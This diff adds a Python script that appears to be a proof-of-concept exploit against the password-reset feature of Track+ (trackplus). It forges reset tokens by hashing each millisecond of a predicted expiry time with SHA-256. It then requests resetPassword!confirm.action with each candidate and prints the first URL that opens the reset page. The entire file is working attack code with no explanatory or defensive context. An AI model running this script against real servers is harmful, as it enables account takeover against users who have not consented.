@@ -1,0 +1,33 @@
+import requests
+import hashlib,os
+import time
+from datetime import datetime, timezone
+from email.utils import parsedate_to_datetime
+
+def get_server_time(response):
+    date_header = response.headers.get('Date')
+    if date_header:
+        return parsedate_to_datetime(date_header)
+    return None
+
+def main():
+    BASE_URL = os.getenv("BaseURL")
+    EMAIL = os.getenv("email")
+    date_header = os.getenv("date_header")
+    server_time = parsedate_to_datetime(date_header)
+    if not server_time:
+        return
+    server_time_ms = int(server_time.timestamp() * 1000)
+    expiry_time_ms = server_time_ms + 28800000
+    base_expiry_sec = (expiry_time_ms // 1000) * 1000
+    for ms in range(1000):
+        candidate_expiry_ms = base_expiry_sec + ms
+        token = hashlib.sha256(str(candidate_expiry_ms).encode()).hexdigest()
+        test_url = f"{BASE_URL}/resetPassword!confirm.action?ctk={token}"
+        r = requests.get(test_url, allow_redirects=False)
+        if 'com.trackplus.app.logon.ResetPasswordApplication' in r.text:
+            print(test_url)
+            return
+
+if __name__ == "__main__":
+    main()
